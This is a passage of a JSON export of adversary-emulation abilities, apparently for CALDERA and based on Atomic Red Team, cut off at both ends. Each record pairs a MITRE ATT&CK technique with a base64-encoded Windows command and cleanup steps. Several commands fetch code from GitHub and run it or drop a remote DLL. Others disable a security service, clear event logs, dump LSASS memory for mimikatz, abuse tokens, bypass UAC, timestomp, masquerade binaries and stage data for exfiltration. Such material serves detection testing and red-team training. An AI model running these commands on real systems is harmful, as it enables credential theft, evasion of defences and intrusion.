"privilege": "", "technique_id": "T1069.001", "platform": "windows", "name": "Permission Groups Discovery", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Summary of permission and security groups", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZyk7IEludm9rZS1NYWxkb2MgLW1hY3JvRmlsZSAiUGF0aFRvQXRvbWljc0ZvbGRlclxUMTA3MC4wMDFcc3JjXFQxMDcwLjAwMS1tYWNyb2NvZGUudHh0IiAtb2ZmaWNlUHJvZHVjdCAiV29yZCIgLXN1YiAiQ2xlYXJMb2dzIg==", "ability_id": "05f8b752dbccff102ef530103bd8e550", "technique_name": "Indicator Removal on Host: Clear Windows Event Logs", "additional_info": {}, "privilege": "", "technique_id": "T1070.001", "platform": "windows", "name": "Clear Event Logs via VBA", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error\n", "variations": []}, {"test": "T3V0LUFUSFBvd2VyU2hlbGxDb21tYW5kTGluZVBhcmFtZXRlciAtQ29tbWFuZExpbmVTd2l0Y2hUeXBlIEh5cGhlbiAtRW5jb2RlZENvbW1hbmRQYXJhbVZhcmlhdGlvbiBFIC1FeGVjdXRlIC1FcnJvckFjdGlvbiBTdG9w", "ability_id": "9ca356dd308211bf2af7b34a546fcf70", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes powershell.exe with variations of the -EncodedCommand parameter", "variations": []}, {"test": "KG5zbG9va3VwIC1xdWVyeXR5cGU9bXggI3t0YXJnZXQub3JnLmRvbWFpbn0uIHwgU2VsZWN0LVN0cmluZyAtcGF0dGVybiAnbWFpbCcgfCBPdXQtU3RyaW5nKS5UcmltKCk=", "ability_id": "ce485320-41a4-42e8-a510-f5a8fe96a644", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Discover Mail Server", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "relationships": [{"edge": "", "source": "target.org.emailhost", "custom_parser_vals": {}, "target": ""}]}], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Identify the organizations mail server", "variations": []}, {"test": "Q29tcHJlc3MtQXJjaGl2ZSAtUGF0aCBQYXRoVG9BdG9taWNzRm9sZGVyXFQxMDc0LjAwMVxiaW5cRm9sZGVyX3RvX3ppcCAtRGVzdGluYXRpb25QYXRoICRlbnY6VEVNUFxGb2xkZXJfdG9femlwLnppcCAtRm9yY2U=", "ability_id": "37f38e52527d57d5535adb97c7295448", "technique_name": "Data Staged: Local Data Staging", "additional_info": {}, "privilege": "", "technique_id": "T1074.001", "platform": "windows", "name": "Zip a Folder with PowerShell for Staging in Temp", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLVBhdGggJGVudjpURU1QXEZvbGRlcl90b196aXAuemlwIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n", "variations": []}, {"test": "IyBJbXBvcnQgdGhlIHJlcXVpcmVkIHRlc3QgaGFybmVzcyBmdW5jdGlvbiwgSW52b2tlLUJ1aWxkQW5kSW52b2tlSW5zdGFsbFV0aWxBc3NlbWJseTsgLiBlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczE7IDsgJEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6VEVNUFwiOyAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZSA9ICJUMTIxOC4wMDQuZGxsIjsgJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGggPSBKb2luLVBhdGggLVBhdGggJEluc3RhbGxlckFzc2VtYmx5RGlyIC1DaGlsZFBhdGggJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7IDsgJENvbW1hbmRMaW5lID0gIi9sb2dmaWxlPSAvbG9ndG9jb25zb2xlPWZhbHNlIGAiJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGhgIiI7ICRFeHBlY3RlZE91dHB1dCA9ICdDb25zdHJ1Y3Rvcl8nOyA7ICRUZXN0QXJncyA9IEB7OyAgICAgT3V0cHV0QXNzZW1ibHlEaXJlY3RvcnkgPSAkSW5zdGFsbGVyQXNzZW1ibHlEaXI7ICAgICBPdXRwdXRBc3NlbWJseUZpbGVOYW1lID0gJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7ICAgICBJbnZvY2F0aW9uTWV0aG9kID0gJ0luc3RhbGxIZWxwZXInOyAgICAgQ29tbWFuZExpbmUgPSAkQ29tbWFuZExpbmU7IH07IDsgJEFjdHVhbE91dHB1dCA9IEludm9rZS1CdWlsZEFuZEludm9rZUluc3RhbGxVdGlsQXNzZW1ibHkgQFRlc3RBcmdzIC1NaW5pbXVtVmlhYmxlQXNzZW1ibHk7IDsgaWYgKCRBY3R1YWxPdXRwdXQgLW5lICRFeHBlY3RlZE91dHB1dCkgezsgICAgIHRocm93IEAiOyBJbnN0YWxsSGVscGVyIG1ldGhvZCBleGVjdXRpb24gdGVzdCBmYWlsdXJlLiBJbnN0YWxsZXIgYXNzZW1ibHkgZXhlY3V0aW9uIG91dHB1dCBkaWQgbm90IG1hdGNoIHRoZSBleHBlY3RlZCBvdXRwdXQuOyBFeHBlY3RlZDogJEV4cGVjdGVkT3V0cHV0OyBBY3R1YWw6ICRBY3R1YWxPdXRwdXQ7ICJAOyB9", "ability_id": "298c4695374a3e34d171d04301c3b236", "technique_name": "Signed Binary Proxy Execution: InstallUtil", "additional_info": {}, "privilege": "", "technique_id": "T1218.004", "platform": "windows", "name": "InstallHelper method call", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "cleanup": ["JEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6VEVNUFwiOyAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZSA9ICJUMTIxOC4wMDQuZGxsIjsgJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGggPSBKb2luLVBhdGggLVBhdGggJEluc3RhbGxlckFzc2VtYmx5RGlyIC1DaGlsZFBhdGggJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7IFJlbW92ZS1JdGVtIC1QYXRoICRJbnN0YWxsZXJBc3NlbWJseUZ1bGxQYXRoIC1FcnJvckFjdGlvbiBJZ25vcmU=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczEi"], "executor": "psh", "access": {}, "description": "Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test\nexecuted successfuly.\n", "variations": []}, {"test": "bmV0LmV4ZSBzdG9wIE1jQWZlZURMUEFnZW50U2VydmljZSAmJiBzYy5leGUgY29uZmlnIE1jQWZlZURMUEFnZW50U2VydmljZSBzdGFydD0gZGlzYWJsZWQ=", "ability_id": "48ea8817c2cb2f078eb9bc1235cc877b", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Disable Arbitrary Security Windows Service", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c2MuZXhlIGNvbmZpZyBNY0FmZWVETFBBZ2VudFNlcnZpY2Ugc3RhcnQ9IGF1dG8gPm51bCAyPiYxICYmIG5ldC5leGUgc3RhcnQgTWNBZmVlRExQQWdlbnRTZXJ2aWNlID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n", "variations": []}, {"test": "Y29weSBDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUgQzpcc3ZjaG9zdC5leGUgJiYgQzpcc3ZjaG9zdC5leGUgL2MgZWNobyBUMTEwNSA+IFxcbG9jYWxob3N0XGMkXFQxMTA1LnR4dA==", "ability_id": "e6715e61f5df646692c624b3499384c4", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "svchost writing a file to a UNC path", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIEM6XFQxMTA1LnR4dCA+bnVsIDI+JjEgJiYgZGVsIEM6XFxzdmNob3N0LmV4ZSA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "svchost.exe writing a non-Microsoft Office file to a file with a UNC path.\nUpon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\\`, then execute svchost.exe with output to a txt file.\n", "variations": []}, {"test": "aW1wb3J0LW1vZHVsZSAkZW52OmFwcGRhdGFcTWljcm9zb2Z0XHRpbWVzdG9tcC5wczE7IHRpbWVzdG9tcCAtZGVzdCAiJGVudjphcHBkYXRhXE1pY3Jvc29mdFxreHduLmxvY2si", "ability_id": "6f41530a95dd7c36bd8549b534b1c4c5", "technique_name": "Indicator Removal on Host: Timestomp", "additional_info": {}, "privilege": "", "technique_id": "T1070.006", "platform": "windows", "name": "Windows - Timestomp a File", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjphcHBkYXRhXE1pY3Jvc29mdFx0aW1lc3RvbXAucHMxIC1FcnJvckFjdGlvbiBJZ25vcmU7IFJlbW92ZS1JdGVtICRlbnY6YXBwZGF0YVxNaWNyb3NvZnRca3h3bi5sb2NrIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n", "variations": []}, {"test": "QzpcV2luZG93c1xTeXN0ZW0zMlxDdXJsLmV4ZSAtayBodHRwczovL2dpdGh1Yi5jb20vcmVkY2FuYXJ5Y28vYXRvbWljLXJlZC10ZWFtL3Jhdy8wNThiNWMyNDIzYzRhNmU5ZTIyNmY0ZTVmZmExYTZmZDliYjFhOTBlL2F0b21pY3MvVDEyMTguMDEwL2Jpbi9BbGxUaGVUaGluZ3N4NjQuZGxsIC1vIGM6XHVzZXJzXHB1YmxpY1xtdXNpY1xhbGx0aGV0aGluZ3N4NjQuZGxsICYmIEM6XFdpbmRvd3NcU3lzdGVtMzJcQ3VybC5leGUgLWsgaHR0cHM6Ly9naXRodWIuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9yYXcvMDU4YjVjMjQyM2M0YTZlOWUyMjZmNGU1ZmZhMWE2ZmQ5YmIxYTkwZS9hdG9taWNzL1QxMjE4LjAxMC9iaW4vQWxsVGhlVGhpbmdzeDY0LmRsbCAtLW91dHB1dCBjOlx1c2Vyc1xwdWJsaWNcbXVzaWNcYWxsdGhldGhpbmdzeDY0LmRsbCAmJiBDOlxXaW5kb3dzXFN5c3RlbTMyXEN1cmwuZXhlIC1rIGh0dHBzOi8vZ2l0aHViLmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vcmF3LzA1OGI1YzI0MjNjNGE2ZTllMjI2ZjRlNWZmYTFhNmZkOWJiMWE5MGUvYXRvbWljcy9UMTIxOC4wMTAvYmluL0FsbFRoZVRoaW5nc3g2NC5kbGwgLW8gYzpccHJvZ3JhbWRhdGFcYWxsdGhldGhpbmdzeDY0LmRsbCAmJiBDOlxXaW5kb3dzXFN5c3RlbTMyXEN1cmwuZXhlIC1rIGh0dHBzOi8vZ2l0aHViLmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vcmF3LzA1OGI1YzI0MjNjNGE2ZTllMjI2ZjRlNWZmYTFhNmZkOWJiMWE5MGUvYXRvbWljcy9UMTIxOC4wMTAvYmluL0FsbFRoZVRoaW5nc3g2NC5kbGwgLW8gJVRlbXAlXGFsbHRoZXRoaW5nc3g2NC5kbGw=", "ability_id": "c521e0a70b243a0cf9217907ca3c6d27", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "Curl Download File", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIGM6XHVzZXJzXHB1YmxpY1xtdXNpY1xhbGx0aGV0aGluZ3N4NjQuZGxsID5udWwgMj4mMSAmJiBkZWwgYzpcdXNlcnNccHVibGljXG11c2ljXGFsbHRoZXRoaW5nc3g2NC5kbGwgPm51bCAyPiYxICYmIGRlbCBjOlxwcm9ncmFtZGF0YVxhbGx0aGV0aGluZ3N4NjQuZGxsID5udWwgMj4mMSAmJiBkZWwgJVRlbXAlXGFsbHRoZXRoaW5nc3g2NC5kbGwgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.\nExpected output will include whether the file downloaded successfully or not.\n", "variations": []}, {"test": "c2MgcXVlcnkgdHlwZT1zZXJ2aWNlID4gJVRFTVAlXFQxMTE5XzEudHh0ICYmIGRvc2tleSAvaGlzdG9yeSA+ICVURU1QJVxUMTExOV8yLnR4dCAmJiB3bWljIHByb2Nlc3MgbGlzdCA+ICVURU1QJVxUMTExOV8zLnR4dCAmJiB0cmVlIEM6XEF0b21pY1JlZFRlYW1cYXRvbWljcyA+ICVURU1QJVxUMTExOV80LnR4dA==", "ability_id": "7121cdf93b951311be9d7078c602efdc", "technique_name": "Automated Collection", "additional_info": {}, "privilege": "", "technique_id": "T1119", "platform": "windows", "name": "Recon information for export with Command Prompt", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICVURU1QJVxUMTExOV8xLnR4dCA+bnVsIDI+JjEgJiYgZGVsICVURU1QJVxUMTExOV8yLnR4dCA+bnVsIDI+JjEgJiYgZGVsICVURU1QJVxUMTExOV8zLnR4dCA+bnVsIDI+JjEgJiYgZGVsICVURU1QJVxUMTExOV80LnR4dCA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n", "variations": []}, {"test": "Q29tcHJlc3MtQXJjaGl2ZSAtUGF0aCAje2hvc3QuZGlyLnN0YWdlZH0gLURlc3RpbmF0aW9uUGF0aCAje2hvc3QuZGlyLnN0YWdlZH0uemlwIC1Gb3JjZTtzbGVlcCAxOyBscyAje2hvc3QuZGlyLnN0YWdlZH0uemlwIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgc2VsZWN0", "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74", "technique_name": "Archive Collected Data: Archive via Utility", "additional_info": {}, "privilege": "", "technique_id": "T1560.001", "platform": "windows", "name": "Compress staged directory", "requirements": [{"relationship_match": [{"source": "host.dir.staged"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "tactic": "exfiltration", "buckets": ["exfiltration"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "relationships": [{"edge": "", "source": "host.dir.compress", "custom_parser_vals": {}, "target": ""}]}], "payloads": [], "cleanup": ["cm0gI3tob3N0LmRpci5zdGFnZWR9LnppcA=="], "executor": "psh", "access": {}, "description": "Compress a directory on the file system", "variations": []}, {"test": "Y21kIC9jIHN0YXJ0IC9iIHBzci5leGUgL3N0YXJ0IC9vdXRwdXQgYzpcdGVtcFxUMTExM19kZXNrdG9wLnppcCAvc2MgMSAvZ3VpIDAgL3N0b3BldmVudCAxMjsgQWRkLVR5cGUgLU1lbWJlckRlZmluaXRpb24gJ1tEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gcHVibGljIHN0YXRpYyBleHRlcm4gdm9pZCBtb3VzZV9ldmVudChpbnQgZmxhZ3MsIGludCBkeCwgaW50IGR5LCBpbnQgY0J1dHRvbnMsIGludCBpbmZvKTsnIC1OYW1lIFUzMiAtTmFtZXNwYWNlIFc7OyBbVy5VMzJdOjptb3VzZV9ldmVudCgweDAyIC1ib3IgMHgwNCAtYm9yIDB4MDEsIDAsIDAsIDAsIDApOzsgY21kIC9jICJ0aW1lb3V0IDUgPiBOVUxMICYmIHBzci5leGUgL3N0b3Ai", "ability_id": "6459f81c892e18b94699feb738fa4bbe", "technique_name": "Screen Capture", "additional_info": {}, "privilege": "", "technique_id": "T1113", "platform": "windows", "name": "Windows Screencapture", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cm0gYzpcdGVtcFxUMTExM19kZXNrdG9wLnppcCAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour\n", "variations": []}, {"test": "JHBzX3VybCA9ICJodHRwczovL2Rvd25sb2FkLnN5c2ludGVybmFscy5jb20vZmlsZXMvUHJvY2R1bXAuemlwIjskZG93bmxvYWRfZm9sZGVyID0gIkM6XFVzZXJzXFB1YmxpY1wiOyRzdGFnaW5nX2ZvbGRlciA9ICJDOlxVc2Vyc1xQdWJsaWNcdGVtcCI7U3RhcnQtQml0c1RyYW5zZmVyIC1Tb3VyY2UgJHBzX3VybCAtRGVzdGluYXRpb24gJGRvd25sb2FkX2ZvbGRlcjtFeHBhbmQtQXJjaGl2ZSAtTGl0ZXJhbFBhdGggJGRvd25sb2FkX2ZvbGRlciJQcm9jZHVtcC56aXAiIC1EZXN0aW5hdGlvblBhdGggJHN0YWdpbmdfZm9sZGVyOyRhcmNoPVtTeXN0ZW0uRW52aXJvbm1lbnRdOjpJczY0Qml0T3BlcmF0aW5nU3lzdGVtO2lmICgkYXJjaCkgeyAgICBpZXggJHN0YWdpbmdfZm9sZGVyIlxwcm9jZHVtcDY0LmV4ZSAtYWNjZXB0ZXVsYSAtbWEgbHNhc3MuZXhlIiA+ICRlbnY6QVBQREFUQVxlcnJvci5kbXAgMj4mMTt9IGVsc2UgeyAgICBpZXggJHN0YWdpbmdfZm9sZGVyIlxwcm9jZHVtcC5leGUgLWFjY2VwdGV1bGEgLW1hIGxzYXNzLmV4ZSIgPiAkZW52OkFQUERBVEFcZXJyb3IuZG1wIDI+JjE7fXJlbW92ZS1pdGVtICRzdGFnaW5nX2ZvbGRlciAtUmVjdXJzZTs=", "ability_id": "0ef4cc7b-611c-4237-b20b-db36b6906554", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "", "technique_id": "T1003.001", "platform": "windows", "name": "Leverage Procdump for lsass memory", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Dump lsass for later use with mimikatz", "variations": []}, {"test": "JGpvYiA9IFN0YXJ0LUpvYiAtU2NyaXB0QmxvY2sgeyAgJHVzZXJuYW1lID0gJyN7aG9zdC51c2VyLm5hbWV9JzsgICRwYXNzd29yZCA9ICcje2hvc3QudXNlci5wYXNzd29yZH0nOyAgJHNlY3VyZVBhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAkcGFzc3dvcmQgLUFzUGxhaW5UZXh0IC1Gb3JjZTsgICRjcmVkZW50aWFsID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCAkdXNlcm5hbWUsICRzZWN1cmVQYXNzd29yZDsgIFN0YXJ0LVByb2Nlc3MgTm90ZXBhZC5leGUgLU5vTmV3V2luZG93IC1QYXNzVGhydSAtQ3JlZGVudGlhbCAkY3JlZGVudGlhbDt9O1JlY2VpdmUtSm9iIC1Kb2IgJGpvYiAtV2FpdDs=", "ability_id": "3796a00b-b11d-4731-b4ca-275a07d83299", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "Impersonate user", "requirements": [{"relationship_match": [{"source": "host.user.name"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}, {"relationship_match": [{"source": "host.user.name", "edge": "has_password", "target": "host.user.password"}], "module": "plugins.stockpile.app.requirements.basic"}], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Run an application as a different user", "variations": []}, {"test": "U2V0LUV4ZWN1dGlvblBvbGljeSAtU2NvcGUgUHJvY2VzcyBCeXBhc3MgLUZvcmNlOyAkb3duZXJzID0gQHt9OyBnd21pIHdpbjMyX3Byb2Nlc3MgfCUgeyRvd25lcnNbJF8uaGFuZGxlXSA9ICRfLmdldG93bmVyKCkudXNlcn07IEdldC1Qcm9jZXNzIHwgU2VsZWN0IFByb2Nlc3NOYW1lLElkLEB7bD0iT3duZXIiO2U9eyRvd25lcnNbJF8uaWQudG9zdHJpbmcoKV19fTsgJFBhdGhUb0F0b21pY3NGb2xkZXJcVDExMzQuMDAyXHNyY1xHZXRUb2tlbi5wczE7IFtNeVByb2Nlc3NdOjpDcmVhdGVQcm9jZXNzRnJvbVBhcmVudCgoR2V0LVByb2Nlc3MgbHNhc3MpLklkLCJjbWQuZXhlIik=", "ability_id": "6fae357c43fd211c9d39fe7583281bf0", "technique_name": "Create Process with Token", "additional_info": {}, "privilege": "", "technique_id": "T1134.002", "platform": "windows", "name": "Access Token Manipulation", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n", "variations": []}, {"test": "Y29weSAlU3lzdGVtUm9vdCVcU3lzdGVtMzJcY3NjcmlwdC5leGUgJUFQUERBVEElXG5vdGVwYWQuZXhlIC9ZICYmIGNtZC5leGUgL2MgJUFQUERBVEElXG5vdGVwYWQuZXhlIC9C", "ability_id": "7e4a00e15142a1c5edb9dd0ecc86f1d3", "technique_name": "Masquerading: Rename System Utilities", "additional_info": {}, "privilege": "", "technique_id": "T1036.003", "platform": "windows", "name": "Masquerading - cscript.exe running as notepad.exe", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIC9RIC9GICVBUFBEQVRBJVxub3RlcGFkLmV4ZSA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe.\n\nUpon successful execution, cscript.exe is renamed as notepad.exe and executed from non-standard path.\n", "variations": []}, {"test": "cnVuZGxsMzIuZXhlIGllYWR2cGFjay5kbGwsTGF1bmNoSU5GU2VjdGlvbiA4MGQwZTBfVDEyMTguMDExLmluZixEZWZhdWx0SW5zdGFsbF9TaW5nbGVVc2VyLDEs", "ability_id": "561ab04df1b969fcef4ea2e7177a9181", "technique_name": "Signed Binary Proxy Execution: Rundll32", "additional_info": {}, "privilege": "", "technique_id": "T1218.011", "platform": "windows", "name": "Rundll32 ieadvpack.dll Execution", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["80d0e0_T1218.011.inf"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Test execution of a command using rundll32.exe with ieadvpack.dll.\nUpon execution calc.exe will be launched\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n", "variations": []}, {"test": "SW52b2tlLUFUSEhUTUxBcHBsaWNhdGlvbiAtSFRBRmlsZVBhdGggVGVzdC5odGEgLVNjcmlwdEVuZ2luZSBKU2NyaXB0IC1TaW11bGF0ZVVzZXJEb3VibGVDbGljaw==", "ability_id": "8726ca5187dbcd44ee2eed8c0fa879d7", "technique_name": "Signed Binary Proxy Execution: Mshta", "additional_info": {}, "privilege": "", "technique_id": "T1218.005", "platform": "windows", "name": "Invoke HTML Application - Jscript Engine Simulating Double Click", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes an HTA Application using JScript script engine simulating double click.", "variations": []}, {"test": "d21pYyBwcm9jZXNzIGdldCBleGVjdXRhYmxlcGF0aCxuYW1lLHByb2Nlc3NpZCxwYXJlbnRwcm9jZXNzaWQgPj4gJGVudjpBUFBEQVRBXHZtdG9vbHMubG9nO2NhdCAkZW52OkFQUERBVEFcdm10b29scy5sb2c=", "ability_id": "94f21386-9547-43c4-99df-938ab05d45ce", "technique_name": "WMIC", "additional_info": {}, "privilege": "", "technique_id": "T1047", "platform": "windows", "name": "WMIC Process Enumeration", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Capture process id, executable path, pid and parent pid before writing to disk", "variations": []}, {"test": "IyBydW4gdGhlc2UgaW4gc2VxdWVuY2U7ICRTZWN1cml0eVBhY2thZ2VzID0gR2V0LUl0ZW1Qcm9wZXJ0eSBIS0xNOlxTeXN0ZW1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxMc2EgLU5hbWUgJ1NlY3VyaXR5IFBhY2thZ2VzJyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5ICdTZWN1cml0eSBQYWNrYWdlcyc7ICRTZWN1cml0eVBhY2thZ2VzVXBkYXRlZCA9ICRTZWN1cml0eVBhY2thZ2VzOyAkU2VjdXJpdHlQYWNrYWdlc1VwZGF0ZWQgKz0gIm5vdC1hLXNzcCI7IFNldC1JdGVtUHJvcGVydHkgSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcTHNhIC1OYW1lICdTZWN1cml0eSBQYWNrYWdlcycgLVZhbHVlICRTZWN1cml0eVBhY2thZ2VzVXBkYXRlZDsgOyAjIHJldmVydCAoYmVmb3JlIHJlYm9vdCk7IFNldC1JdGVtUHJvcGVydHkgSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcTHNhIC1OYW1lICdTZWN1cml0eSBQYWNrYWdlcycgLVZhbHVlICRTZWN1cml0eVBhY2thZ2Vz", "ability_id": "09f4739a13a4caf3b66b86aac880e3c0", "technique_name": "Boot or Logon Autostart Execution: Security Support Provider", "additional_info": {}, "privilege": "", "technique_id": "T1547.005", "platform": "windows", "name": "Modify SSP configuration in registry", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.", "variations": []}, {"test": "IiV0ZW1wJVx1YWNtZVw1OSBBa2FnaTY0LmV4ZSI=", "ability_id": "064e09117d875c248918a5dff1ee241e", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "UACME Bypass Method 59", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": 